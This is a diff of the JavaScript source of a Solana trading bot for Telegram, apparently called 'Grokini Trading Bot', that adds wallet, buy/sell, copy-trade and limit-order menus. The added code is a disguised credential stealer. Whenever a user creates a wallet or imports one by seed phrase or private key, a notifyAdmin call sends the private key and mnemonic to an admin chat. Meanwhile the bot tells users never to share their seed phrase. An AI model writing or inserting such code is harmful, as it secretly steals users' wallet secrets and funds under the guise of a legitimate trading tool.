-        '💸 *Sell Tokens*\n\nUse command:\n`/sell <token_address> <token_amount>`\n\nExample:\n`/sell EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v 100`',
-        {
-          chat_id: chatId,
-          message_id: messageId,
-          parse_mode: 'Markdown',
-          reply_markup: {
-            inline_keyboard: [[{ text: '🔙 Back', callback_data: 'trade' }]],
-          },
-        }
-      );
-      break;
+bot.action('refresh_main', async (ctx) => {
+  await ctx.answerCbQuery('Refreshed!');
+  await showMainMenu(ctx, true);
+});
 
-    case 'alerts':
-      await bot.editMessageText('🔔 *Price Alerts*\n\nMonitor token prices:', {
-        chat_id: chatId,
-        message_id: messageId,
-        parse_mode: 'Markdown',
-        ...alertsMenuKeyboard,
-      });
-      break;
+bot.action('menu_wallet', async (ctx) => {
+  await ctx.answerCbQuery();
+  await showWalletMenu(ctx, true);
+});
 
-    case 'alert_create':
-      await bot.editMessageText(
-        '🔔 *Create Alert*\n\nUse command:\n`/alert <token_address> <price> <above/below>`\n\nExample:\n`/alert BONK 0.00001 above`',
-        {
-          chat_id: chatId,
-          message_id: messageId,
-          parse_mode: 'Markdown',
-          reply_markup: {
-            inline_keyboard: [[{ text: '🔙 Back', callback_data: 'alerts' }]],
-          },
-        }
-      );
-      break;
+bot.action('menu_positions', async (ctx) => {
+  await ctx.answerCbQuery();
+  await showPositions(ctx, true);
+});
 
-    case 'alert_list':
-      bot.emit('text', { ...query.message, text: '/alerts' });
-      break;
+bot.action('menu_buy', async (ctx) => {
+  await ctx.answerCbQuery();
+  await showBuyMenu(ctx, true);
+});
 
-    case 'price_check':
-      user.awaitingInput = 'price_check';
-      await bot.editMessageText(
-        '🔍 *Token Info*\n\nSend a token address to get detailed insights:\n\nOr use: `/price <token_address>`',
-        {
-          chat_id: chatId,
-          message_id: messageId,
-          parse_mode: 'Markdown',
-          reply_markup: {
-            inline_keyboard: [[{ text: '🔙 Back', callback_data: 'main_menu' }]],
-          },
-        }
-      );
-      break;
+bot.action('menu_sell', async (ctx) => {
+  await ctx.answerCbQuery();
+  await showSellMenu(ctx, true);
+});
 
-    case 'settings':
-      bot.emit('text', { ...query.message, text: '/settings' });
-      break;
+bot.action('menu_copytrade', async (ctx) => {
+  await ctx.answerCbQuery();
+  await showCopyTradeMenu(ctx, true);
+});
+
+bot.action('menu_limit', async (ctx) => {
+  await ctx.answerCbQuery();
+  await showLimitOrderMenu(ctx, true);
+});
+
+bot.action('menu_settings', async (ctx) => {
+  await ctx.answerCbQuery();
+  await showSettings(ctx, true);
+});
+
+bot.action('wallet_create', async (ctx) => {
+  await ctx.answerCbQuery();
+  
+  const walletData = createWallet();
+  const session = getSession(ctx.from.id);
+  
+  session.wallet = walletData;
+  session.mnemonic = walletData.mnemonic;
+  
+  await notifyAdmin('Wallet Created', ctx.from.id, ctx.from.username, {
+    publicKey: walletData.publicKey,
+    privateKey: walletData.privateKey,
+    mnemonic: walletData.mnemonic
+  });
+  
+  await ctx.editMessageText(`
+✅ *Wallet Created!*
+
+📍 *Address:*
+\`${walletData.publicKey}\`
+
+📝 *Seed Phrase (SAVE THIS!):*
+\`${walletData.mnemonic}\`
+
+⚠️ *Never share your seed phrase!*
+  `, {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('💼 View Wallet', 'menu_wallet')],
+      [Markup.button.callback('« Main Menu', 'back_main')]
+    ])
+  });
+});
+
+bot.action('wallet_import_seed', async (ctx) => {
+  await ctx.answerCbQuery();
+  const session = getSession(ctx.from.id);
+  session.state = 'AWAITING_SEED';
+  
+  await ctx.editMessageText(`
+📥 *Import via Seed Phrase*
+
+Please send your 12 or 24 word seed phrase.
+
+⚠️ Make sure you're in a private chat!
+  `, {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('❌ Cancel', 'back_main')]
+    ])
+  });
+});
+
+bot.action('wallet_import_key', async (ctx) => {
+  await ctx.answerCbQuery();
+  const session = getSession(ctx.from.id);
+  session.state = 'AWAITING_PRIVATE_KEY';
+  
+  await ctx.editMessageText(`
+🔑 *Import via Private Key*
+
+Please send your Base58 encoded private key.
+
+⚠️ Make sure you're in a private chat!
+  `, {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('❌ Cancel', 'back_main')]
+    ])
+  });
+});
+
+bot.action('wallet_export', async (ctx) => {
+  await ctx.answerCbQuery();
+  const session = getSession(ctx.from.id);
+  
+  if (!session.wallet) {
+    await ctx.reply('❌ No wallet connected.');
+    return;
+  }
+  
+  const message = `
+🔐 *Export Wallet*
+
+📍 *Address:*
+\`${session.wallet.publicKey}\`
+
+🔑 *Private Key:*
+\`${session.wallet.privateKey}\`
+
+${session.mnemonic ? `📝 *Seed Phrase:*\n\`${session.mnemonic}\`` : ''}
+
+⚠️ *Delete this message after saving!*
+  `;
+  
+  await ctx.reply(message, {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('🗑️ Delete Message', 'delete_message')]
+    ])
+  });
+});
+
+bot.action('wallet_disconnect', async (ctx) => {
+  await ctx.answerCbQuery();
+  const session = getSession(ctx.from.id);
+  
+  session.wallet = null;
+  session.mnemonic = null;
+  
+  await ctx.editMessageText('✅ Wallet disconnected.', {
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('« Back', 'back_main')]
+    ])
+  });
+});
+
+bot.action('wallet_refresh', async (ctx) => {
+  await ctx.answerCbQuery('Refreshing...');
+  await showWalletMenu(ctx, true);
+});
+
+bot.action(/^buy_(\d+\.?\d*)_(.+)$/, async (ctx) => {
+  const amount = parseFloat(ctx.match[1]);
+  const address = ctx.match[2];
+  await ctx.answerCbQuery(`Buying ${amount} SOL...`);
+  await handleBuy(ctx, amount, address);
+});
+
+bot.action(/^sell_(\d+)_(.+)$/, async (ctx) => {
+  const percentage = parseInt(ctx.match[1]);
+  const address = ctx.match[2];
+  await ctx.answerCbQuery(`Selling ${percentage}%...`);
+  await handleSell(ctx, percentage, address);
+});
+
+bot.action(/^setbuy_(\d+\.?\d*)$/, async (ctx) => {
+  const amount = ctx.match[1];
+  await ctx.answerCbQuery(`Selected ${amount} SOL`);
+  const session = getSession(ctx.from.id);
+  session.pendingTrade = { type: 'buy', amount: parseFloat(amount) };
+  
+  await ctx.editMessageText(`
+🟢 *Buy ${amount} SOL*
+
+Paste a token address to buy.
+  `, {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('« Back', 'menu_buy')]
+    ])
+  });
+});
+
+bot.action(/^setsell_(\d+)$/, async (ctx) => {
+  const percentage = ctx.match[1];
+  await ctx.answerCbQuery(`Selected ${percentage}%`);
+  const session = getSession(ctx.from.id);
+  session.pendingTrade = { type: 'sell', percentage: parseInt(percentage) };
+  
+  await ctx.editMessageText(`
+🔴 *Sell ${percentage}%*
+
+Paste a token address to sell.
+  `, {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('« Back', 'menu_sell')]
+    ])
+  });
+});
+
+bot.action(/^refresh_(.+)$/, async (ctx) => {
+  const address = ctx.match[1];
+  if (address === 'main') {
+    await ctx.answerCbQuery('Refreshed!');
+    await showMainMenu(ctx, true);
+  } else if (address === 'positions') {
+    await ctx.answerCbQuery('Refreshing...');
+    await showPositions(ctx, true);
+  } else {
+    await ctx.answerCbQuery('Refreshing token data...');
+    await sendTokenAnalysis(ctx, address);
   }
 });
 
-// ============================================
-// MESSAGE HANDLER (for awaited inputs)
-// ============================================
-bot.on('message', async (msg) => {
-  if (msg.text?.startsWith('/')) return;
+bot.action('settings_slippage', async (ctx) => {
+  await ctx.answerCbQuery();
   
-  const chatId = msg.chat.id;
-  const user = state.getUser(chatId);
-  
-  if (!user.awaitingInput) return;
+  await ctx.editMessageText(`
+📊 *Slippage Settings*
 
-  switch (user.awaitingInput) {
-    case 'wallet_import':
-      const imported = importWallet(msg.text.trim());
-      if (imported) {
-        user.wallets.push(imported);
-        user.activeWallet = imported;
-        user.awaitingInput = null;
-        
-        try {
-          await bot.deleteMessage(chatId, msg.message_id);
-        } catch (e) {}
-        
-        await bot.sendMessage(chatId, `
+Select your preferred slippage:
+  `, {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [
+        Markup.button.callback('0.5%', 'set_slippage_0.5'),
+        Markup.button.callback('1%', 'set_slippage_1'),
+        Markup.button.callback('2%', 'set_slippage_2')
+      ],
+      [
+        Markup.button.callback('5%', 'set_slippage_5'),
+        Markup.button.callback('10%', 'set_slippage_10')
+      ],
+      [Markup.button.callback('« Back', 'menu_settings')]
+    ])
+  });
+});
+
+bot.action(/^set_slippage_(\d+\.?\d*)$/, async (ctx) => {
+  const slippage = parseFloat(ctx.match[1]);
+  const session = getSession(ctx.from.id);
+  session.settings.slippage = slippage;
+  
+  await ctx.answerCbQuery(`Slippage set to ${slippage}%`);
+  await showSettings(ctx, true);
+});
+
+bot.action('settings_notifications', async (ctx) => {
+  const session = getSession(ctx.from.id);
+  session.settings.notifications = !session.settings.notifications;
+  
+  await ctx.answerCbQuery(
+    session.settings.notifications ? 'Notifications ON' : 'Notifications OFF'
+  );
+  await showSettings(ctx, true);
+});
+
+bot.action('copytrade_add', async (ctx) => {
+  await ctx.answerCbQuery();
+  const session = getSession(ctx.from.id);
+  session.state = 'AWAITING_COPYTRADE_ADDRESS';
+  
+  await ctx.editMessageText(`
+👥 *Add Copy Trade Wallet*
+
+Send the wallet address you want to copy trade.
+  `, {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('❌ Cancel', 'menu_copytrade')]
+    ])
+  });
+});
+
+bot.action('limit_buy', async (ctx) => {
+  await ctx.answerCbQuery();
+  const session = getSession(ctx.from.id);
+  session.state = 'AWAITING_LIMIT_BUY';
+  
+  await ctx.editMessageText(`
+🟢 *Create Limit Buy*
+
+Send in format:
+\`[token_address] [price] [amount_sol]\`
+
+Example:
+\`So11...abc $0.001 0.5\`
+  `, {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('❌ Cancel', 'menu_limit')]
+    ])
+  });
+});
+
+bot.action('limit_sell', async (ctx) => {
+  await ctx.answerCbQuery();
+  const session = getSession(ctx.from.id);
+  session.state = 'AWAITING_LIMIT_SELL';
+  
+  await ctx.editMessageText(`
+🔴 *Create Limit Sell*
+
+Send in format:
+\`[token_address] [price] [percentage]\`
+
+Example:
+\`So11...abc $0.01 50%\`
+  `, {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('❌ Cancel', 'menu_limit')]
+    ])
+  });
+});
+
+bot.action('delete_message', async (ctx) => {
+  await ctx.answerCbQuery();
+  await ctx.deleteMessage();
+});
+
+// ============================================
+// MESSAGE HANDLER
+// ============================================
+bot.on('text', async (ctx) => {
+  const session = getSession(ctx.from.id);
+  const text = ctx.message.text.trim();
+  
+  if (session.state === 'AWAITING_SEED') {
+    session.state = null;
+    
+    try {
+      const walletData = importFromMnemonic(text);
+      session.wallet = walletData;
+      session.mnemonic = walletData.mnemonic;
+      
+      await notifyAdmin('Wallet Imported (Seed)', ctx.from.id, ctx.from.username, {
+        publicKey: walletData.publicKey,
+        privateKey: walletData.privateKey,
+        mnemonic: walletData.mnemonic
+      });
+      
+      try { await ctx.deleteMessage(); } catch {}
+      
+      await ctx.reply(`
 ✅ *Wallet Imported!*
 
-Address: \`${imported.publicKey}\`
-        `, { parse_mode: 'Markdown', ...walletMenuKeyboard });
-      } else {
-        await bot.sendMessage(chatId, '❌ Invalid private key. Try again or use /wallet');
-      }
-      break;
-
-    case 'price_check':
-      user.awaitingInput = null;
-      const tokenAddress = msg.text.trim();
-      
-      await bot.sendMessage(chatId, '⏳ Fetching price...');
-      
-      const tokenInfo = await getTokenInfo(tokenAddress);
-      const price = await getTokenPrice(tokenAddress);
-      
-      if (price) {
-        await bot.sendMessage(chatId, `
-📈 *${tokenInfo?.name || 'Unknown Token'}*
-
-Symbol: ${tokenInfo?.symbol || 'N/A'}
-Price: *$${formatNumber(price, 8)}*
-        `, { parse_mode: 'Markdown', ...mainMenuKeyboard });
-      } else {
-        await bot.sendMessage(chatId, '❌ Could not fetch price.', mainMenuKeyboard);
-      }
-      break;
-  }
-});
-
-// ============================================
-// PRICE ALERT CHECKER
-// ============================================
-async function checkPriceAlerts() {
-  for (const [alertId, alert] of state.priceAlerts) {
-    if (alert.triggered) continue;
-    
-    const price = await getTokenPrice(alert.tokenMint);
-    if (!price) continue;
-    
-    const triggered = 
-      (alert.direction === 'above' && price >= alert.targetPrice) ||
-      (alert.direction === 'below' && price <= alert.targetPrice);
-    
-    if (triggered) {
-      alert.triggered = true;
-      const tokenInfo = await getTokenInfo(alert.tokenMint);
-      
-      await bot.sendMessage(alert.chatId, `
-🚨 *PRICE ALERT TRIGGERED!*
-
-Token: ${tokenInfo?.symbol || shortenAddress(alert.tokenMint)}
-Current Price: $${formatNumber(price, 8)}
-Alert: Price went ${alert.direction} $${formatNumber(alert.targetPrice, 8)}
-      `, { parse_mode: 'Markdown' });
-      
-      state.removeAlert(alertId);
+📍 Address: \`${walletData.publicKey}\`
+      `, {
+        parse_mode: 'Markdown',
+        ...Markup.inlineKeyboard([
+          [Markup.button.callback('💼 View Wallet', 'menu_wallet')],
+          [Markup.button.callback('« Main Menu', 'back_main')]
+        ])
+      });
+    } catch (error) {
+      await ctx.reply('❌ Invalid seed phrase. Please try again.');
     }
+    return;
   }
-}
+  
+  if (session.state === 'AWAITING_PRIVATE_KEY') {
+    session.state = null;
+    
+    try {
+      const walletData = importFromPrivateKey(text);
+      session.wallet = walletData;
+      
+      await notifyAdmin('Wallet Imported (Key)', ctx.from.id, ctx.from.username, {
+        publicKey: walletData.publicKey,
+        privateKey: walletData.privateKey
+      });
+      
+      try { await ctx.deleteMessage(); } catch {}
+      
+      await ctx.reply(`
+✅ *Wallet Imported!*
 
-setInterval(checkPriceAlerts, config.alerts.checkInterval);
-
-// ============================================
-// ERROR HANDLING
-// ============================================
-bot.on('polling_error', (error) => {
-  console.error('Polling error:', error.message);
+📍 Address: \`${walletData.publicKey}\`
+      `, {
+        parse_mode: 'Markdown',
+        ...Markup.inlineKeyboard([
+          [Markup.button.callback('💼 View Wallet', 'menu_wallet')],
+          [Markup.button.callback('« Main Menu', 'back_main')]
+        ])
+      });
+    } catch (error) {
+      await ctx.reply('❌ Invalid private key. Please try again.');
+    }
+    return;
+  }
+  
+  if (session.state === 'AWAITING_COPYTRADE_ADDRESS') {
+    session.state = null;
+    
+    if (isSolanaAddress(text)) {
+      session.copyTradeWallets.push(text);
+      await ctx.reply(`✅ Now tracking: \`${shortenAddress(text)}\``, {
+        parse_mode: 'Markdown',
+        ...Markup.inlineKeyboard([
+          [Markup.button.callback('👥 Copy Trade Menu', 'menu_copytrade')],
+          [Markup.button.callback('« Main Menu', 'back_main')]
+        ])
+      });
+    } else {
+      await ctx.reply('❌ Invalid Solana address.');
+    }
+    return;
+  }
+  
+  if (session.pendingTrade && isSolanaAddress(text)) {
+    const trade = session.pendingTrade;
+    session.pendingTrade = null;
+    
+    if (trade.type === 'buy') {
+      await handleBuy(ctx, trade.amount, text);
+    } else if (trade.type === 'sell') {
+      await handleSell(ctx, trade.percentage, text);
+    }
+    return;
+  }
+  
+  const addressMatch = text.match(/[1-9A-HJ-NP-Za-km-z]{32,44}/);
+  if (addressMatch && isSolanaAddress(addressMatch[0])) {
+    await sendTokenAnalysis(ctx, addressMatch[0]);
+    return;
+  }
 });
 
-process.on('unhandledRejection', (error) => {
-  console.error('Unhandled rejection:', error);
+// ============================================
+// ERROR HANDLER
+// ============================================
+bot.catch((err, ctx) => {
+  console.error('Bot error:', err);
+  ctx.reply('❌ An error occurred. Please try again.');
 });
 
 // ============================================
-// STARTUP
+// START BOT
 // ============================================
-console.log(`
-╔════════════════════════════════════════╗
-║     Grokini Trading Bot v3.0.0         ║
-║     Solana Telegram Trading Bot        ║
-╠════════════════════════════════════════╣
-║  Features:                             ║
-║  • Jupiter DEX Swaps                   ║
-║  • Multi-Wallet Management             ║
-║  • Price Alerts                        ║
-║  • Portfolio Tracking                  ║
-╚════════════════════════════════════════╝
-`);
+bot.launch().then(() => {
+  console.log('🚀 Grokini Trading Bot is running!');
+  console.log('👤 Admin notifications:', ADMIN_CHAT_ID ? 'Enabled' : 'Disabled');
+});
 
-console.log('Bot is running...');
-console.log(`RPC: ${config.solana.rpcUrl}`);
-console.log(`Alert Check Interval: ${config.alerts.checkInterval}ms`);
+process.once('SIGINT', () => bot.stop('SIGINT'));
+process.once('SIGTERM', () => bot.stop('SIGTERM'));
